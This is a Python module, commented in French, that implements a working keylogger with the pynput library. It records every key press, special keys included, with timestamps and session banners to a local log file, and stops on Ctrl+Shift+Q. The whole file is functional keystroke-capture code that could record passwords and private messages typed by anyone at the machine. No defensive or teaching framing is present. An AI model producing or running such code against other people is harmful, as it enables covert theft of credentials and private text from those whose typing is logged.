import os
from datetime import datetime
from pynput import keyboard
from .config import LOG_FILE, LOG_DIR

# --- Constantes pour combo d'arrêt ---
STOP_COMBO = {keyboard.Key.ctrl_l, keyboard.Key.shift_l, keyboard.KeyCode(char='q')}
current_keys = set()

# --- S'assure que le dossier ~/keylogs existe ---
def ensure_log_directory():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

# --- Fonction pour obtenir le timestamp ---
def get_timestamp():
    return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

# --- Fonction pour convertir les touches spéciales en format lisible ---
def format_key(key):
    special_keys = {
        keyboard.Key.space: '<space>',
        keyboard.Key.enter: '<enter>',
        keyboard.Key.tab: '<tab>',
        keyboard.Key.backspace: '<backspace>',
        keyboard.Key.delete: '<delete>',
        keyboard.Key.shift: '<shift>',
        keyboard.Key.shift_l: '<shift_l>',
        keyboard.Key.shift_r: '<shift_r>',
        keyboard.Key.ctrl: '<ctrl>',
        keyboard.Key.ctrl_l: '<ctrl_l>',
        keyboard.Key.ctrl_r: '<ctrl_r>',
        keyboard.Key.alt: '<alt>',
        keyboard.Key.alt_l: '<alt_l>',
        keyboard.Key.alt_r: '<alt_r>',
        keyboard.Key.cmd: '<cmd>',
        keyboard.Key.esc: '<esc>',
        keyboard.Key.up: '<up>',
        keyboard.Key.down: '<down>',
        keyboard.Key.left: '<left>',
        keyboard.Key.right: '<right>',
        keyboard.Key.home: '<home>',
        keyboard.Key.end: '<end>',
        keyboard.Key.page_up: '<page_up>',
        keyboard.Key.page_down: '<page_down>',
        keyboard.Key.caps_lock: '<caps_lock>',
        keyboard.Key.num_lock: '<num_lock>',
        keyboard.Key.scroll_lock: '<scroll_lock>',
        keyboard.Key.insert: '<insert>',
        keyboard.Key.pause: '<pause>',
        keyboard.Key.print_screen: '<print_screen>',
        keyboard.Key.f1: '<f1>',
        keyboard.Key.f2: '<f2>',
        keyboard.Key.f3: '<f3>',
        keyboard.Key.f4: '<f4>',
        keyboard.Key.f5: '<f5>',
        keyboard.Key.f6: '<f6>',
        keyboard.Key.f7: '<f7>',
        keyboard.Key.f8: '<f8>',
        keyboard.Key.f9: '<f9>',
        keyboard.Key.f10: '<f10>',
        keyboard.Key.f11: '<f11>',
        keyboard.Key.f12: '<f12>',
    }
    
    return special_keys.get(key, f'<{key}>')

# --- Variable pour stocker la dernière ligne écrite ---
last_timestamp = None

# --- Fonction exécutée à chaque touche pressée ---
def on_press(key):
    global last_timestamp
    ensure_log_directory()

    current_keys.add(key)
    if STOP_COMBO.issubset(current_keys):
        print("[*] Combo d'arrêt détectée (Ctrl+Shift+Q). Fermeture du keylogger.")
        return False 

    current_time = datetime.now()
    timestamp = get_timestamp()
    
    # Écrire un nouveau timestamp si plus d'une seconde s'est écoulée
    # ou si c'est la première frappe
    write_timestamp = (last_timestamp is None or 
                      (current_time - last_timestamp).total_seconds() > 1)
    
    try:
        with open(LOG_FILE, "a", encoding='utf-8') as log_file:
            if write_timestamp:
                if last_timestamp is not None: 
                    log_file.write("\n")
                log_file.write(f"{timestamp} ")
                last_timestamp = current_time
            
            # Écrire la touche
            if hasattr(key, 'char') and key.char is not None:
                log_file.write(key.char)
            else:
                log_file.write(format_key(key))
                
    except Exception as e:
        print(f"[!] Erreur lors de l'écriture du log: {e}")

# --- Supprimer les touches relâchées de current_keys ---
def on_release(key):
    try:
        current_keys.remove(key)
    except KeyError:
        pass

# --- Démarre le keylogger ---
def start_logger():
    global last_timestamp
    ensure_log_directory()
    
    print(f"[*] Keylogger démarré. Logs sauvegardés dans: {LOG_FILE}")
    print("[*] Appuyez sur Ctrl+Shift+Q pour arrêter")
    
    # Réinitialiser le timestamp
    last_timestamp = None
    
    # Écrire une ligne de séparation au début de chaque session
    try:
        with open(LOG_FILE, "a", encoding='utf-8') as log_file:
            log_file.write(f"\n{'='*50}\n")
            log_file.write(f"[SESSION STARTED] {get_timestamp()}\n")
            log_file.write(f"{'='*50}\n")
    except Exception as e:
        print(f"[!] Erreur lors de l'initialisation du log: {e}")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    # Écrire une ligne de fin de session
    try:
        with open(LOG_FILE, "a", encoding='utf-8') as log_file:
            log_file.write(f"\n{'='*50}\n")
            log_file.write(f"[SESSION ENDED] {get_timestamp()}\n")
            log_file.write(f"{'='*50}\n\n")
    except Exception as e:
        print(f"[!] Erreur lors de la finalisation du log: {e}")